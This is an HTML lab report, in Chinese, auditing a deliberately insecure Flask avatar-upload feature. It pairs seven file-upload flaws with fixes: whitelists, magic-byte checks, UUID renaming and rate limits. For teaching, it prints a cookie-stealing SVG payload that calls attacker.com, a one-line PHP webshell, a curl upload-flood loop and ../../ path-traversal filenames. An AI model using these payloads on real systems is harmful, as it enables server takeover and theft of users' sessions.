@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="文件上传漏洞分析与防护实践报告 — 7 类上传漏洞分析与修复，涵盖 WebShell、路径穿越、XSS 等">
+  <meta name="keywords" content="文件上传, WebShell, 路径穿越, XSS, Burp Suite, Flask">
+  <meta property="og:title" content="文件上传漏洞分析与防护报告">
+  <meta property="og:description" content="头像上传功能安全审计全记录 — 7 个漏洞 + 5 种安全机制">
+  <title>文件上传漏洞分析与防护报告 | Flask 安全审计</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📁</text></svg>">
+</head>
+<body>
+
+  <!-- ===== 导航栏 ===== -->
+  <nav class="navbar">
+    <a href="../" class="nav-brand"><span class="brand-icon">📁</span> 上传漏洞分析</a>
+    <button class="nav-toggle">☰</button>
+    <ul class="nav-links">
+      <li><a href="#overview">实验概述</a></li>
+      <li><a href="#vulns">漏洞分析</a></li>
+      <li><a href="#burp">Burp 攻击</a></li>
+      <li><a href="#fix">防护方案</a></li>
+      <li><a href="#summary">总结</a></li>
+      <li><a href="../" style="border:1px solid rgba(255,255,255,0.3);">← 返回首页</a></li>
+    </ul>
+  </nav>
+
+  <!-- ===== 封面 ===== -->
+  <header class="hero">
+    <div class="hero-particles"></div>
+    <div class="hero-badge">文 件 上 传 漏 洞 分 析 报 告</div>
+    <h1>文件上传漏洞分析<br>与防护实践报告</h1>
+    <p class="hero-sub">Flask 用户管理系统 — 头像上传功能安全审计全记录</p>
+    <div class="hero-divider"></div>
+    <div class="hero-meta">
+      <strong>实验环境：</strong>Kali Linux · Flask 3.1 · SQLite 3 · Burp Suite CE<br>
+      <strong>靶机地址：</strong>http://192.168.14.129:5000 &nbsp;|&nbsp; <strong>报告日期：</strong>2026-07-09
+    </div>
+    <div class="hero-scroll">↓ 向下滚动</div>
+  </header>
+
+  <main class="container">
+
+    <!-- ===== 一、实验概述 ===== -->
+    <section id="overview" class="section">
+      <div class="section-header">
+        <h2>一、实验概述</h2>
+        <p>Experiment Overview</p>
+      </div>
+
+      <h3>1.1 实验目的</h3>
+      <ol>
+        <li>理解<strong>文件上传漏洞</strong>的产生原理与常见攻击手法</li>
+        <li>掌握使用 Burp Suite 和 curl 进行文件上传漏洞测试的方法</li>
+        <li>学会识别不安全的文件上传实现中的 7 类典型漏洞</li>
+        <li>掌握文件上传功能的<strong>安全加固方案</strong>（白名单校验、文件名消毒、内容检测等）</li>
+        <li>建立文件上传功能的<strong>纵深防御</strong>思维</li>
+      </ol>
+
+      <h3>1.2 不安全的功能规范</h3>
+      <div class="table-wrapper">
+        <table>
+          <thead><tr><th>项目</th><th>要求（故意保留的不安全写法）</th></tr></thead>
+          <tbody>
+            <tr><td>文件保存路径</td><td><code>static/uploads/</code></td></tr>
+            <tr><td>文件名处理</td><td>使用用户上传的<strong>原始文件名</strong>，不重命名</td></tr>
+            <tr><td>文件类型检查</td><td><strong>不检查</strong>文件后缀名或 MIME 类型</td></tr>
+            <tr><td>文件校验函数</td><td><strong>不调用</strong>任何校验函数</td></tr>
+            <tr><td>文件大小限制</td><td>仅通过 <code>MAX_CONTENT_LENGTH = 16MB</code> 限制</td></tr>
+            <tr><td>CSRF 防护</td><td>有（与登录/注册共用机制）</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="summary-stats">
+        <div class="stat-card stat-danger"><div class="stat-num">7</div><div class="stat-label">发现漏洞</div></div>
+        <div class="stat-card"><div class="stat-num">7</div><div class="stat-label">已修复</div></div>
+        <div class="stat-card"><div class="stat-num">2严重</div><div class="stat-label">最高等级</div></div>
+        <div class="stat-card"><div class="stat-num">5种</div><div class="stat-label">安全机制</div></div>
+      </div>
+
+      <h3>1.3 上传功能架构与攻击面</h3>
+      <div class="arch-box">
+                         用户访问入口<br>
+                    http://192.168.14.129:5000<br>
+                              │<br>
+                              ▼<br>
+    ┌─────────────────────────────────────────────────────┐<br>
+    │  GET+POST /upload → 头像上传 ★ 本次新增               │<br>
+    └──────────────────────────┬──────────────────────────┘<br>
+                               │<br>
+    ┌──────────────────────────▼──────────────────────────┐<br>
+    │  静态文件服务 — static/uploads/                       │<br>
+    │  ├── avatar.jpg    （正常用户上传）                    │<br>
+    │  ├── shell.php     （攻击者上传的 WebShell）           │<br>
+    │  ├── steal.html    （XSS 恶意页面）                    │<br>
+    │  └── ../../app.py  （路径穿越覆盖源文件）              │<br>
+    └─────────────────────────────────────────────────────┘
+      </div>
+    </section>
+
+    <!-- ===== 二、漏洞分析 ===== -->
+    <section id="vulns" class="section">
+      <div class="section-header">
+        <h2>二、漏洞分析与修复</h2>
+        <p>Vulnerability Analysis &amp; Remediation</p>
+      </div>
+
+      <!-- === 漏洞 1 === -->
+      <div class="vuln-card sev-critical">
+        <div class="vuln-header"><span class="vuln-num">1</span><h3>无文件类型限制（任意文件上传）</h3><span class="tag tag-critical">严重 · CVSS 9.0</span></div>
+        <p><strong>CWE-434 · 可上传任意类型文件</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Python — 问题代码</span><button class="copy-btn">复制代码</button></div>
+          <pre>file = request.files["file"]
+filename = file.filename        # 直接取原始文件名
+file.save(os.path.join(UPLOAD_DIR, filename))  # 无任何校验</pre>
+        </div>
+        <p><strong>攻击复现：</strong>上传 PHP WebShell <code>shell.php</code>、恶意 HTML <code>steal.html</code>、篡改配置 <code>.htaccess</code>，全部成功！</p>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span>无任何文件类型检查</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span>扩展名白名单 + 魔数校验</div>
+        </div>
+      </div>
+
+      <!-- === 漏洞 2 === -->
+      <div class="vuln-card sev-critical">
+        <div class="vuln-header"><span class="vuln-num">2</span><h3>原始文件名保留（路径穿越）</h3><span class="tag tag-critical">严重 · CVSS 8.6</span></div>
+        <p><strong>CWE-22 · 文件名含 <code>../</code> 可覆盖任意文件</strong></p>
+        <div class="arch-box">
+正常保存：static/uploads/avatar.jpg<br>
+路径穿越：static/uploads/../../app.py → 覆盖项目根目录 app.py！
+        </div>
+        <div class="table-wrapper">
+          <table>
+            <thead><tr><th>原始文件名</th><th>实际写入路径</th><th>危害</th></tr></thead>
+            <tbody>
+              <tr><td><code>../../app.py</code></td><td>项目根目录/app.py</td><td><strong>覆盖源代码！</strong></td></tr>
+              <tr><td><code>../../templates/index.html</code></td><td>项目根目录/templates/index.html</td><td><strong>篡改页面！</strong></td></tr>
+              <tr><td><code>../../data/users.db</code></td><td>项目根目录/data/users.db</td><td><strong>覆盖数据库！</strong></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span>原始文件名直接保存</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span>UUID 重命名 + 移除路径穿越字符</div>
+        </div>
+      </div>
+
+      <!-- === 漏洞 3 === -->
+      <div class="vuln-card sev-high">
+        <div class="vuln-header"><span class="vuln-num">3</span><h3>文件覆盖风险</h3><span class="tag tag-high">高危</span></div>
+        <p><strong>同文件名静默覆盖已有文件，无任何警告。</strong></p>
+        <p>场景：攻击者上传同名的 <code>avatar.jpg</code> 覆盖其他用户的头像，或多次上传同名的 <code>shell.php</code> 更新 WebShell。</p>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span><code>file.save()</code> 静默覆盖</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span>UUID 唯一文件名，永不重复</div>
+        </div>
+      </div>
+
+      <!-- === 漏洞 4 === -->
+      <div class="vuln-card sev-high">
+        <div class="vuln-header"><span class="vuln-num">4</span><h3>存储型 XSS（恶意 HTML/JS 上传）</h3><span class="tag tag-high">高危 · CVSS 7.6</span></div>
+        <p><strong>CWE-79 · HTML/SVG 文件中的恶意脚本可窃取 Cookie</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">SVG XSS Payload</span><button class="copy-btn">复制代码</button></div>
+          <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;
+    fetch('http://attacker.com/steal?cookie=' + document.cookie);
+  &lt;/script&gt;
+  &lt;circle cx="50" cy="50" r="40" fill="blue"/&gt;
+&lt;/svg&gt;</pre>
+        </div>
+        <p>攻击者上传恶意 HTML/SVG 文件 → 将 URL 发给其他用户 → 用户访问时 Cookie 被窃取。</p>
+      </div>
+
+      <!-- === 漏洞 5 === -->
+      <div class="vuln-card sev-medium">
+        <div class="vuln-header"><span class="vuln-num">5</span><h3>无上传频率限制</h3><span class="tag tag-medium">中危</span></div>
+        <p><strong>CWE-770 · 可无限次上传导致 DoS</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Bash — DoS 攻击脚本</span><button class="copy-btn">复制代码</button></div>
+          <pre>for i in {1..10000}; do
+  curl -b cookies.txt -F "file=@/tmp/large.bin" http://target/upload
+done</pre>
+        </div>
+        <p><strong>危害：</strong>磁盘空间耗尽、Inode 耗尽、带宽被占用。</p>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span>无频率限制</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span>每用户 60 秒最多 5 次</div>
+        </div>
+      </div>
+
+      <!-- === 漏洞 6 === -->
+      <div class="vuln-card sev-medium">
+        <div class="vuln-header"><span class="vuln-num">6</span><h3>CSRF 绕过与重复提交</h3><span class="tag tag-medium">中危</span></div>
+        <p><strong>CWE-352 · CSRF Token 未在提交后刷新</strong></p>
+        <p>同一个 CSRF Token 可被反复使用，攻击者获取一个有效 Token 后可在短时间内批量上传大量文件。</p>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span>Token 可重复使用</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span>上传成功后刷新 Token</div>
+        </div>
+      </div>
+
+      <!-- === 漏洞 7 === -->
+      <div class="vuln-card sev-low">
+        <div class="vuln-header"><span class="vuln-num">7</span><h3>文件大小限制仅依赖服务端配置</h3><span class="tag tag-low">低危</span></div>
+        <p><strong>缺少前端限制，大文件需等待上传完成才报错</strong></p>
+        <div class="fix-compare">
+          <div class="fix-box fix-before"><span class="fix-label">❌ 修复前</span><code>&lt;input type="file"&gt;</code> 无限制</div>
+          <div class="fix-box fix-after"><span class="fix-label">✅ 修复后</span><code>accept="image/*"</code> 前端类型+大小提示</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 三、Burp Suite 攻击复现 ===== -->
+    <section id="burp" class="section">
+      <div class="section-header">
+        <h2>三、Burp Suite 攻击复现全流程</h2>
+        <p>Burp Suite Attack Reproduction</p>
+      </div>
+
+      <h3>3.1 拦截上传请求</h3>
+      <div class="burp-panel">
+步骤1：登录系统 → 浏览器访问 /login → 填写 admin/admin123 → Burp 拦截 → Forward<br>
+步骤2：进入上传页面 → 点击「上传头像」→ Burp 拦截 GET /upload → Forward<br>
+步骤3：选择 shell.php → 点击「上传」→ Burp 拦截 POST /upload<br><br>
+<span class="hl">POST /upload HTTP/1.1</span><br>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<br><br>
+------WebKitFormBoundary<br>
+Content-Disposition: form-data; name="csrf_token"<br>
+abc123token...<br>
+------WebKitFormBoundary<br>
+<span class="hl">Content-Disposition: form-data; name="file"; filename="shell.php"</span><br>
+Content-Type: application/x-php<br>
+<span class="hl">&lt;?php system($_GET["cmd"]); ?&gt;</span>
+      </div>
+
+      <h3>3.2 路径穿越攻击（Repeater）</h3>
+      <div class="burp-panel">
+在 Burp Repeater（Ctrl+R）中修改 filename 参数：<br><br>
+测试1：filename="avatar.jpg"<br>
+  响应：200 OK → 文件保存到 static/uploads/avatar.jpg<br><br>
+<span class="hl">测试2：filename="../../app.py"<br>
+  响应：200 OK → 文件覆盖了 app.py 源代码！</span>
+      </div>
+
+      <h3>3.3 攻击结果汇总</h3>
+      <div class="table-wrapper">
+        <table>
+          <thead><tr><th>测试项目</th><th>状态</th><th>结果</th></tr></thead>
+          <tbody>
+            <tr><td>上传 PHP 文件 shell.php</td><td><span class="tag tag-critical">成功</span></td><td>保存到 static/uploads/shell.php</td></tr>
+            <tr><td>上传 HTML 文件 steal.html</td><td><span class="tag tag-critical">成功</span></td><td>可被浏览器直接访问</td></tr>
+            <tr><td>上传 SVG 文件 evil.svg</td><td><span class="tag tag-critical">成功</span></td><td>SVG 中 JS 可执行</td></tr>
+            <tr><td>上传 .htaccess</td><td><span class="tag tag-critical">成功</span></td><td>上传到 static/uploads/.htaccess</td></tr>
+            <tr><td>路径穿越 ../../app.py</td><td><span class="tag tag-critical">成功</span></td><td>文件写出到项目根目录！</td></tr>
+            <tr><td>MIME 欺骗伪装图片</td><td><span class="tag tag-critical">成功</span></td><td>无论声明什么 MIME 都通过</td></tr>
+            <tr><td>Intruder 批量上传 100 次</td><td><span class="tag tag-critical">成功</span></td><td>无频率限制，全部写入</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 四、防护方案 ===== -->
+    <section id="fix" class="section">
+      <div class="section-header">
+        <h2>四、文件上传漏洞防护方案</h2>
+        <p>Security Hardening</p>
+      </div>
+
+      <h3>4.1 五层防护体系</h3>
+      <div class="arch-box">
+                   文件上传安全防护体系
+
+第一层（核心）：文件类型白名单校验
+  只允许：.jpg .jpeg .png .gif .webp
+  禁止：.php .exe .html .js .svg .htaccess
+
+第二层（辅助）：文件内容校验
+  检查 MIME Content-Type
+  读取文件头魔数（Magic Bytes）
+
+第三层（关键）：文件名消毒
+  移除 ../ 路径穿越字符
+  使用 UUID 重命名
+
+第四层（基础）：存储安全
+  不存在 Web 可执行目录
+  设置目录不可执行权限
+
+第五层（业务）：业务层防护
+  上传频率限制 + 文件大小限制（前端+后端）
+</div>
+
+      <h3>4.2 核心修复代码</h3>
+      <h4>文件扩展名白名单</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">Python</span><button class="copy-btn">复制代码</button></div>
+        <pre>ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp"}
+
+def allowed_file(filename):
+    if "." not in filename:
+        return False
+    ext = os.path.splitext(filename)[1].lower()
+    return ext in ALLOWED_EXTENSIONS</pre>
+      </div>
+
+      <h4>UUID 文件名消毒</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">Python</span><button class="copy-btn">复制代码</button></div>
+        <pre>def safe_filename(filename):
+    """UUID 重命名，防止路径穿越和重名"""
+    ext = os.path.splitext(filename)[1].lower()
+    return f"{uuid.uuid4().hex}{ext}"</pre>
+      </div>
+
+      <h4>Magic Bytes 文件头校验</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">Python</span><button class="copy-btn">复制代码</button></div>
+        <pre>def validate_file_content(file_stream):
+    """读取文件头魔数验证文件类型"""
+    magic_bytes = {
+        b"\xff\xd8\xff": "jpeg",
+        b"\x89PNG": "png",
+        b"GIF89a": "gif",
+        b"RIFF": "webp",
+    }
+    header = file_stream.read(4)
+    file_stream.seek(0)
+    for magic in magic_bytes:
+        if header.startswith(magic):
+            return True, magic_bytes[magic]
+    return False, None</pre>
+      </div>
+
+      <h4>白名单 vs 黑名单原则</h4>
+      <div class="arch-box">
+黑名单（不安全）：禁止 .php、.exe、.jsp...
+  → 总有遗漏，如 .php5、.phtml、.shtml
+
+白名单（安全）：只允许 .jpg、.png、.gif...
+  → 明确可接受的范围，没有遗漏
+      </div>
+
+      <h3>4.3 修复前后对比</h3>
+      <div class="table-wrapper">
+        <table class="compare-table">
+          <thead><tr><th>检查项</th><th>修复前</th><th>修复后</th></tr></thead>
+          <tbody>
+            <tr><td>文件扩展名</td><td>无检查</td><td>白名单校验</td></tr>
+            <tr><td>MIME 类型</td><td>无检查</td><td>验证 Content-Type 头</td></tr>
+            <tr><td>文件内容（魔数）</td><td>无检查</td><td>读取文件头 4 字节验证</td></tr>
+            <tr><td>文件名处理</td><td>原始文件名直接保存</td><td>UUID 重命名</td></tr>
+            <tr><td>上传频率限制</td><td>无</td><td>每用户 60 秒最多 5 次</td></tr>
+            <tr><td>CSRF Token</td><td>可重复使用</td><td>上传后刷新 Token</td></tr>
+            <tr><td>错误信息</td><td><code>f"上传失败: {e}"</code></td><td>统一提示</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>4.4 测试验证结果</h3>
+      <div class="table-wrapper">
+        <table>
+          <thead><tr><th>#</th><th>测试内容</th><th>修复前</th><th>修复后</th><th>结论</th></tr></thead>
+          <tbody>
+            <tr><td>T1</td><td>上传正常图片</td><td>成功</td><td>成功</td><td>✅ 功能正常</td></tr>
+            <tr><td>T2</td><td>上传 PHP WebShell</td><td>成功（危险）</td><td>拒绝</td><td>✅ 修复</td></tr>
+            <tr><td>T3</td><td>上传恶意 HTML</td><td>成功（危险）</td><td>拒绝</td><td>✅ 修复</td></tr>
+            <tr><td>T4</td><td>路径穿越 ../../app.py</td><td>覆盖源文件</td><td>UUID 拒绝</td><td>✅ 修复</td></tr>
+            <tr><td>T5</td><td>MIME 欺骗伪装</td><td>通过</td><td>魔数拦截</td><td>✅ 修复</td></tr>
+            <tr><td>T6</td><td>60秒上传6次</td><td>全部成功</td><td>第6次限速</td><td>✅ 修复</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 五、总结 ===== -->
+    <section id="summary" class="section">
+      <div class="section-header">
+        <h2>五、总结与反思</h2>
+        <p>Summary &amp; Reflections</p>
+      </div>
+
+      <h3>5.1 七种攻击手法</h3>
+      <div class="arch-box">
+漏洞类型                     攻击方式
+────────────────────────────────────────────────────
+任意文件上传       → 上传 WebShell、恶意脚本
+路径穿越           → 文件名含 ../ 覆盖关键文件
+文件覆盖           → 同名文件静默覆盖
+存储型 XSS         → 上传 HTML/SVG 窃取 Cookie
+无限制上传         → 耗尽磁盘空间（DoS）
+CSRF + 重复提交    → 批量上传滥用
+大小限制不完整     → 带宽消耗
+      </div>
+
+      <h3>5.2 安全上传的五个必须</h3>
+      <ul class="principle-list">
+        <li><strong>必须限制文件扩展名</strong> — 白名单，不是黑名单</li>
+        <li><strong>必须验证文件内容</strong> — 魔数 + MIME 双重验证</li>
+        <li><strong>必须消毒文件名</strong> — UUID 重命名，移除路径穿越字符</li>
+        <li><strong>必须限制上传频率</strong> — 防止 DoS 攻击</li>
+        <li><strong>必须限制文件大小</strong> — 前端 + 后端双重限制</li>
+      </ul>
+
+      <h3>5.3 Web 安全学习路径</h3>
+      <div class="arch-box">
+第一阶段：密码安全修复（7个漏洞）→ SQL注入防护 → CSRF防护<br>
+第二阶段：文件上传漏洞（7个攻击面）→ 白名单 + 魔数 + UUID + 限速<br>
+第三阶段（可继续学习）：XSS → SSRF → SSTI → 反序列化
+      </div>
+
+      <blockquote>
+        <p><strong>"永远不要相信用户上传的文件。文件名是假的，扩展名是假的，MIME 头是假的，文件内容也可能是假的。"</strong></p>
+        <p>文件上传功能是 Web 应用中最容易被忽视的攻击面之一。一个看似简单的头像上传功能，如果不做安全加固，可能成为攻击者控制整个服务器的入口。</p>
+      </blockquote>
+
+      <h3>5.4 安全检查清单</h3>
+      <div class="checklist-box">
+[ ] 是否使用了白名单机制限制文件扩展名？<br>
+[ ] 是否验证了文件内容的 Magic Bytes？<br>
+[ ] 是否验证了 MIME Content-Type？<br>
+[ ] 是否对文件名进行了消毒处理（移除 ../）？<br>
+[ ] 是否使用 UUID 重命名文件？<br>
+[ ] 是否限制了文件大小（前端 + 后端）？<br>
+[ ] 是否限制了上传频率？<br>
+[ ] 上传成功后是否刷新了 CSRF Token？<br>
+[ ] 文件是否存储在 Web 根目录之外？<br>
+[ ] 错误信息是否没有暴露路径？<br>
+[ ] 是否有日志记录上传操作？
+      </div>
+    </section>
+
+    <!-- ===== 参考资料 ===== -->
+    <section class="section">
+      <div class="section-header">
+        <h2>参考资料</h2>
+        <p>References</p>
+      </div>
+      <div class="table-wrapper">
+        <table>
+          <thead><tr><th style="width:6%">#</th><th>资料名称</th><th>来源</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>OWASP — Unrestricted File Upload</td><td><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank">owasp.org</a></td></tr>
+            <tr><td>2</td><td>OWASP — File Upload Cheat Sheet</td><td><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank">cheatsheetseries.owasp.org</a></td></tr>
+            <tr><td>3</td><td>CWE-434: Unrestricted Upload</td><td><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank">cwe.mitre.org</a></td></tr>
+            <tr><td>4</td><td>CWE-22: Path Traversal</td><td><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank">cwe.mitre.org</a></td></tr>
+            <tr><td>5</td><td>PortSwigger — File Upload</td><td><a href="https://portswigger.net/web-security/file-upload" target="_blank">portswigger.net</a></td></tr>
+            <tr><td>6</td><td>Flask 文件上传文档</td><td><a href="https://flask.palletsprojects.com/en/stable/patterns/fileuploads/" target="_blank">flask.palletsprojects.com</a></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <p><strong>报告人：</strong>________________ &nbsp;|&nbsp; <strong>指导教师：</strong>________________</p>
+      <p><strong>报告日期：</strong>2026-07-09 &nbsp;|&nbsp; <strong>靶机地址：</strong>http://192.168.14.129:5000</p>
+      <p><strong>项目地址：</strong><a href="https://github.com/Zhaoyang-haha/flask-password-security-audit" target="_blank">github.com/Zhaoyang-haha/flask-password-security-audit</a></p>
+      <p style="margin-top:0.8rem;font-size:0.72rem;color:rgba(255,200,200,0.25);">📁 文件上传漏洞分析与防护报告 &copy; 2026</p>
+    </div>
+  </footer>
+
+  <button class="back-to-top">↑</button>
+  <script src="js/main.js"></script>
+</body>
+</html>
